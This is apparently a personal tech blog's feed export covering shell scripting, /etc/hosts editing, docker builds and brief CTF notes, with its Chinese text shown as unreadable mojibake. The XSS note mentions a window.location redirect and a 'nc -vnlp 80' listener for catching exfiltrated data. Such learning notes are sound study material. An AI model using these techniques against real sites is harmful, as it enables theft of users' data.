ä½¿ç”¨grepæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä¸”æ²¡æœ‰è¢«æ³¨é‡Šæ‰  </span><br><span class="hljs-string">if ! grep -E &quot;</span>^[^<span class="hljs-comment">#]\s*$search_string&quot; /etc/hosts; then  </span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$search_string</span>&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts &gt; /dev/null  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;å·²æ·»åŠ  <span class="hljs-variable">$search_string</span> åˆ° /etc/hosts&quot;</span>  <br><span class="hljs-keyword">else</span>  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$search_string</span> å·²åœ¨ /etc/hosts ä¸­æ‰¾åˆ°ï¼Œæ— éœ€æ·»åŠ &quot;</span>  <br><span class="hljs-keyword">fi</span><br><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240320184104.png" alt="image.png"></p><h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">global: &#123;<br>    <span class="hljs-built_in">test</span>: <span class="hljs-string">&quot;111&quot;</span><br>&#125;<br><br>data: <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">\(global.test)</span><br><span class="hljs-string">#!/bin/sh</span><br><span class="hljs-string">echo -e &quot;</span>\n è¿½åŠ é•œåƒä»“åº“æ˜ å°„åˆ°/etc/hostsæ–‡ä»¶ <span class="hljs-string">&quot;</span><br><span class="hljs-string"># è¦æ£€æŸ¥å¹¶è¿½åŠ çš„IPå’Œä¸»æœºå  </span><br><span class="hljs-string">IP=&quot;</span>1.1.1.1<span class="hljs-string">&quot;  </span><br><span class="hljs-string">HOSTNAME=&quot;</span>abc<span class="hljs-string">&quot;  </span><br><span class="hljs-string"># è¦æœç´¢çš„å­—ç¬¦ä¸²  </span><br><span class="hljs-string">search_string=&quot;</span><span class="hljs-variable">$IP</span> <span class="hljs-variable">$HOSTNAME</span><span class="hljs-string">&quot;  </span><br><span class="hljs-string"></span><br><span class="hljs-string"># ä½¿ç”¨grepæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä¸”æ²¡æœ‰è¢«æ³¨é‡Šæ‰  </span><br><span class="hljs-string">if ! grep -E &quot;</span>^[^<span class="hljs-comment">#]\\s*$search_string&quot; /etc/hosts; then  </span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$search_string</span>&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts &gt; /dev/null  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;å·²æ·»åŠ  <span class="hljs-variable">$search_string</span> åˆ° /etc/hosts&quot;</span>  <br><span class="hljs-keyword">else</span>  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$search_string</span> å·²åœ¨ /etc/hosts ä¸­æ‰¾åˆ°ï¼Œæ— éœ€æ·»åŠ &quot;</span>  <br><span class="hljs-keyword">fi</span><br><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">data2: #&quot;</span><span class="hljs-string">&quot;&quot;</span><br>\(global.test)<br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n è¿½åŠ é•œåƒä»“åº“æ˜ å°„åˆ°/etc/hostsæ–‡ä»¶ &quot;</span><br><span class="hljs-comment"># è¦æ£€æŸ¥å¹¶è¿½åŠ çš„IPå’Œä¸»æœºå  </span><br>IP=<span class="hljs-string">&quot;1.1.1.1&quot;</span>  <br>HOSTNAME=<span class="hljs-string">&quot;abc&quot;</span>  <br><span class="hljs-comment"># è¦æœç´¢çš„å­—ç¬¦ä¸²  </span><br>search_string=<span class="hljs-string">&quot;<span class="hljs-variable">$IP</span> <span class="hljs-variable">$HOSTNAME</span>&quot;</span>  <br><br><span class="hljs-comment"># ä½¿ç”¨grepæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä¸”æ²¡æœ‰è¢«æ³¨é‡Šæ‰  </span><br><span class="hljs-keyword">if</span> ! grep -E <span class="hljs-string">&quot;^[^#]\s*<span class="hljs-variable">$search_string</span>&quot;</span> /etc/hosts; <span class="hljs-keyword">then</span>  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$search_string</span>&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts &gt; /dev/null  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;å·²æ·»åŠ  <span class="hljs-variable">$search_string</span> åˆ° /etc/hosts&quot;</span>  <br><span class="hljs-keyword">else</span>  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$search_string</span> å·²åœ¨ /etc/hosts ä¸­æ‰¾åˆ°ï¼Œæ— éœ€æ·»åŠ &quot;</span>  <br><span class="hljs-keyword">fi</span><br><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240320183912.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ²Ÿé€šè¯¾ç¨‹ç¬”è®°</title>
    <link href="/2023/11/09/%E6%B2%9F%E9%80%9A%E8%AF%BE%E7%A8%8B/%E6%B2%9F%E9%80%9A%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/11/09/%E6%B2%9F%E9%80%9A%E8%AF%BE%E7%A8%8B/%E6%B2%9F%E9%80%9A%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>å‰æœŸè¦æƒ³æ˜ç™½æ€ä¹ˆåšè¿™ä»¶äº‹æƒ…<br>åšå®Œæ±‡æŠ¥ï¼Œæœ€åè¦ç»™å‡ºä¸€ä¸ªä¸‹ä¸€æ­¥è¡ŒåŠ¨ï¼Œè¿™ä¸ªå¾ˆé‡è¦</p><p>æ”¯ç‚¹æ¡†æ¶</p><ul><li>æ¸…é†’ åšå®š åŠªåŠ›</li><li>ç™½è‰² çº¢è‰² é»‘è‰²</li><li>å°è‰ ç«¹å­ â€¦</li><li>å‰ç«¯çš„html css js<br>ä¸‰ç§åŠ¨ç‰© ä¸‰ç§æ¤ç‰© ä¸‰ç§é¥®æ–™ â€¦</li></ul><h2 id="é’Ÿæ‘†æ¡†æ¶-å¤ªå†·-å¤ªçƒ­-åˆšåˆšå¥½"><a href="#é’Ÿæ‘†æ¡†æ¶-å¤ªå†·-å¤ªçƒ­-åˆšåˆšå¥½" class="headerlink" title="é’Ÿæ‘†æ¡†æ¶- å¤ªå†· å¤ªçƒ­ åˆšåˆšå¥½"></a>é’Ÿæ‘†æ¡†æ¶<br>- å¤ªå†· å¤ªçƒ­ åˆšåˆšå¥½</h2><p>TODO: æƒ³è‡ªå·±åˆé€‚çš„è‡ªæˆ‘ä»‹ç»</p><p>åœ¨å¾ˆä¹…å¾ˆä¹…ä»¥å‰ï¼Œæœ‰ä¸€ä¸ªå¸è¡€é­”å¤´ï¼Œä»–å¤©ç”Ÿå—œè¡€æˆæ€§ï¼Œç»å¸¸è£…æ‰®æˆä¸€ä¸ªå¸…æ°”å¤šé‡‘çš„ç”·å­©å­ï¼Œ</p>]]></content>
    
    
    <categories>
      
      <category>æ²Ÿé€šè¯¾ç¨‹</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€shellã€‘(20231101) forå¾ªç¯éå†æ—¶åŠ ä¸åŠ å¼•å·çš„åŒºåˆ«</title>
    <link href="/2023/11/01/shell/%E3%80%90shell%E3%80%91(20231101)%20for%E5%BE%AA%E7%8E%AF%E9%81%8D%E5%8E%86%E6%97%B6%E5%8A%A0%E4%B8%8D%E5%8A%A0%E5%BC%95%E5%8F%B7%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2023/11/01/shell/%E3%80%90shell%E3%80%91(20231101)%20for%E5%BE%AA%E7%8E%AF%E9%81%8D%E5%8E%86%E6%97%B6%E5%8A%A0%E4%B8%8D%E5%8A%A0%E5%BC%95%E5%8F%B7%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## è„šæœ¬</span><br>lines=(<br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;lines[@]&#125;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span><br><span class="hljs-keyword">done</span><br><br><br><span class="hljs-comment">## æ‰§è¡Œ</span><br><span class="hljs-comment"># ll</span><br>total 4<br>-rw------- 1 root root 1805 Jul  7 18:07 anaconda-ks.cfg<br><span class="hljs-comment"># lines=(</span><br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;lines[@]&#125;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span><br><span class="hljs-keyword">done</span><br>anaconda-ks.cfg<br>12<br>34<br>anaconda-ks.cfg<br>56<br>78<br><br><br><br></code></pre></td></tr></table></figure><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## è„šæœ¬</span><br>lines=(<br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;lines[@]&#125;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> <br><span class="hljs-keyword">done</span><br><br><br><span class="hljs-comment">## æ‰§è¡Œ</span><br><span class="hljs-comment"># ll</span><br>total 4<br>-rw------- 1 root root 1805 Jul  7 18:07 anaconda-ks.cfg<br><span class="hljs-comment"># lines=(</span><br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;lines[@]&#125;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> <br><span class="hljs-keyword">done</span><br>anaconda-ks.cfg<br>12<br>34<br>anaconda-ks.cfg<br>56<br>78<br><br><br><br></code></pre></td></tr></table></figure><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## è„šæœ¬</span><br>lines=(<br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;lines[@]&#125;</span>&quot;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> <br><span class="hljs-keyword">done</span><br><br><br><span class="hljs-comment">## æ‰§è¡Œ</span><br><span class="hljs-comment"># ll</span><br>total 4<br>-rw------- 1 root root 1805 Jul  7 18:07 anaconda-ks.cfg<br><span class="hljs-comment"># lines=(</span><br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;lines[@]&#125;</span>&quot;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> <br><span class="hljs-keyword">done</span><br>anaconda-ks.cfg 12 34<br>anaconda-ks.cfg 56 78<br><br><br><br><br><br></code></pre></td></tr></table></figure><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## è„šæœ¬</span><br>lines=(<br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;lines[@]&#125;</span>&quot;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> <br><span class="hljs-keyword">done</span><br><br><br><span class="hljs-comment">## æ‰§è¡Œ</span><br><span class="hljs-comment"># ll</span><br>total 4<br>-rw------- 1 root root 1805 Jul  7 18:07 anaconda-ks.cfg<br><span class="hljs-comment"># lines=(</span><br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;lines[@]&#125;</span>&quot;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> <br><span class="hljs-keyword">done</span><br>* 12 34<br>* 56 78<br></code></pre></td></tr></table></figure><h1 id="è§£é‡Š"><a href="#è§£é‡Š" class="headerlink" title="è§£é‡Š"></a>è§£é‡Š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span>=<span class="hljs-string">&quot;* 12 23&quot;</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$var</span>å’Œ<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$var</span>&quot;</span>ä¸ºä»€ä¹ˆè¾“å‡ºä¸ä¸€æ ·?<br></code></pre></td></tr></table></figure><p><code>echo $var</code> å’Œ <code>echo &quot;$var&quot;</code> ä¹‹æ‰€ä»¥è¾“å‡ºä¸ä¸€æ ·ï¼Œæ˜¯å› ä¸ºå®ƒä»¬åœ¨å¤„ç†å˜é‡æ—¶å¯¹ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ç­‰ï¼‰çš„æ–¹å¼ä¸åŒã€‚åœ¨Shellä¸­ï¼ŒåŒå¼•å· <code>&quot;</code> å’Œä¸ä½¿ç”¨å¼•å·ä¹‹é—´çš„å·®å¼‚æ˜¯å…³é”®ã€‚</p><ol><li><p><code>echo $var</code>: å½“æ‚¨ä½¿ç”¨ <code>echo $var</code> æ—¶ï¼ŒShellä¼šå¯¹å˜é‡è¿›è¡Œå‚æ•°æ‰©å±•ï¼ˆWord Splittingï¼‰ã€‚è¿™æ„å‘³ç€ç©ºç™½å­—ç¬¦è¢«ç”¨ä½œåˆ†éš”ç¬¦ï¼Œå°†å˜é‡çš„å€¼åˆ†å‰²æˆå¤šä¸ªå‚æ•°ï¼Œç„¶åå°†è¿™äº›å‚æ•°ä¼ é€’ç»™<code>echo</code>å‘½ä»¤ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<code>$var</code> ä¸­çš„ç©ºç™½å­—ç¬¦å°†è¢«ç”¨ä½œåˆ†éš”ç¬¦ï¼Œæ‰€ä»¥ <code>*</code>ã€<code>12</code> å’Œ <code>23</code> ä¼šè¢«è§†ä¸ºä¸åŒçš„å‚æ•°ï¼Œè€Œä¸æ˜¯å•ä¸ªå‚æ•°ã€‚</p></li><li><p><code>echo &quot;$var&quot;</code>: å½“æ‚¨ä½¿ç”¨ <code>echo &quot;$var&quot;</code> æ—¶ï¼ŒåŒå¼•å·å°†å˜é‡çš„å€¼è§†ä¸ºä¸€ä¸ªæ•´ä½“ï¼Œä¸ä¼šè¿›è¡Œå‚æ•°æ‰©å±•ã€‚å› æ­¤ï¼Œ<code>$var</code> ä¸­çš„ç©ºç™½å­—ç¬¦ä¿æŒä¸å˜ï¼Œä½œä¸ºä¸€ä¸ªæ•´ä½“ä¼ é€’ç»™<code>echo</code>å‘½ä»¤ï¼Œæ‰€ä»¥è¾“å‡ºå°†æ˜¯ <code>* 12 23</code>ï¼Œè€Œä¸æ˜¯åˆ†è§£æˆå¤šä¸ªå‚æ•°ã€‚<br>è¿™ä¸ªå·®å¼‚åœ¨å¤„ç†åŒ…å«ç©ºç™½å­—ç¬¦çš„å­—ç¬¦ä¸²æ—¶éå¸¸é‡è¦ï¼Œå› ä¸ºå®ƒå½±å“åˆ°å¦‚ä½•å¤„ç†å­—ç¬¦ä¸²ä¸­çš„ç©ºç™½å­—ç¬¦ã€‚å¦‚æœæ‚¨å¸Œæœ›ä¿ç•™å­—ç¬¦ä¸²ä¸­çš„ç©ºç™½å­—ç¬¦å¹¶å°†æ•´ä¸ªå­—ç¬¦ä¸²ä½œä¸ºä¸€ä¸ªå‚æ•°ä¼ é€’ç»™<code>echo</code>æˆ–å…¶ä»–å‘½ä»¤ï¼Œæ‚¨åº”è¯¥ä½¿ç”¨åŒå¼•å· <code>&quot;$var&quot;</code> æ¥å¼•ç”¨å˜é‡ã€‚å¦‚æœéœ€è¦å°†å­—ç¬¦ä¸²æ‹†åˆ†ä¸ºå¤šä¸ªå‚æ•°ï¼Œå¯ä»¥ä¸ä½¿ç”¨å¼•å· <code>echo $var</code>ï¼Œä»¥ä¾¿Shellæ‰§è¡Œå‚æ•°æ‰©å±•ã€‚</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘XSS</title>
    <link href="/2023/10/31/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91XSS/"/>
    <url>/2023/10/31/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91XSS/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808205604.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808211215.png" alt="image.png"></p><p>Burpsuiteï¼š<br>Encoder  å°†ä¸€ä¸ªurlå˜æˆurlçš„ç¼–ç æ–¹å¼<br>Render æ¸²æŸ“</p><p>window.location é‡å®šå‘</p><p>nc -vnlp 80 ç›‘å¬80ç«¯å£</p><h1 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup 2"></a>writeup 2</h1><p><a href="https://www.charseki.com/archives/xss-test-platform">XSS Test Platform</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘pwn</title>
    <link href="/2023/10/31/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn/"/>
    <url>/2023/10/31/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1Pv4y1F73K/?spm_id_from=333.999.0.0&vd_source=3d4bc6a91e11c12d0e3b57b4e50c9818">https://www.bilibili.com/video/BV1Pv4y1F73K/?spm_id_from=333.999.0.0&amp;vd_source=3d4bc6a91e11c12d0e3b57b4e50c9818</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘æ–‡ä»¶ä¸Šä¼ æ¼æ´</title>
    <link href="/2023/10/31/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/10/31/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230809203556.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€cueã€‘test2</title>
    <link href="/2023/10/31/cue/%E3%80%90cue%E3%80%91test2/"/>
    <url>/2023/10/31/cue/%E3%80%90cue%E3%80%91test2/</url>
    
    <content type="html"><![CDATA[<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> SelfNodeVariable.regionImageRegistryResolution &#123;<br>       <br>       &#123;<br>           data: <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">           test3.host</span><br><span class="hljs-string">           &quot;&quot;&quot;</span><br>           mode: <span class="hljs-string">&quot;0755&quot;</span><br>           path: <span class="hljs-string">&quot;test&quot;</span><br>       &#125;<br>     &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€dockerç³»åˆ—ã€‘æ„å»ºdashboardçš„armé•œåƒ</title>
    <link href="/2023/10/31/docker/%E3%80%90docker%E7%B3%BB%E5%88%97%E3%80%91%E6%9E%84%E5%BB%BAdashboard%E7%9A%84arm%E9%95%9C%E5%83%8F/"/>
    <url>/2023/10/31/docker/%E3%80%90docker%E7%B3%BB%E5%88%97%E3%80%91%E6%9E%84%E5%BB%BAdashboard%E7%9A%84arm%E9%95%9C%E5%83%8F/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">############################ 1.ä¸‹è½½ä»“åº“ ############################</span><br>[root@ningan ~]<span class="hljs-comment"># pwd</span><br>/root<br><br>[root@ningan ~]<span class="hljs-comment"># git clone https://github.com/kubernetes/dashboard.git</span><br>Cloning into <span class="hljs-string">&#x27;dashboard&#x27;</span>...<br>remote: Enumerating objects: 95919, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (445/445), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (167/167), <span class="hljs-keyword">done</span>.<br>remote: Total 95919 (delta 307), reused 401 (delta 274), pack-reused 95474<br>Receiving objects: 100% (95919/95919), 183.17 MiB | 5.84 MiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (56815/56815), <span class="hljs-keyword">done</span>.<br><br><span class="hljs-comment">############################ 2.æ‰¾åˆ°mainå‡½æ•° ############################</span><br>[root@ningan ~]<span class="hljs-comment"># cd dashboard</span><br><br>[root@ningan dashboard]<span class="hljs-comment"># git checkout v2.4.0</span><br>Note: checking out <span 